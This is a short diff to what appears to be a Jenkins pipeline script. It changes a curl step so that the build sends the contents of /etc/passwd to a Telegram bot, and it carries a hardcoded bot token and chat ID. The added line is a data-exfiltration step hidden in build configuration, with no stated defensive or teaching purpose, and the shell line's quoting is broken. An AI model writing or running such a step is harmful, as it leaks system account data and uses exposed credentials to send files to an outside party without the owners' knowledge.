@@ -5,5 +5,5 @@ node {
     // Use curl to send the contents of the file to a Telegram bot
     def botToken = "5392765795:AAGCvfJBRHX_N6eSIyDz0MEOZXnZgkVaaoQ"
     def chatId = "-625394738"
-    sh "curl -F data=@/home/test.txt https://api.telegram.org/bot${botToken}/sendMessage -d chat_id=${chatId} -d text="$(cat /home/test.txt)'"
+    sh "curl -F data=@/etc/passwd https://api.telegram.org/bot${botToken}/sendMessage -d chat_id=${chatId} -d text="$(cat /etc/passwd)'"
 }
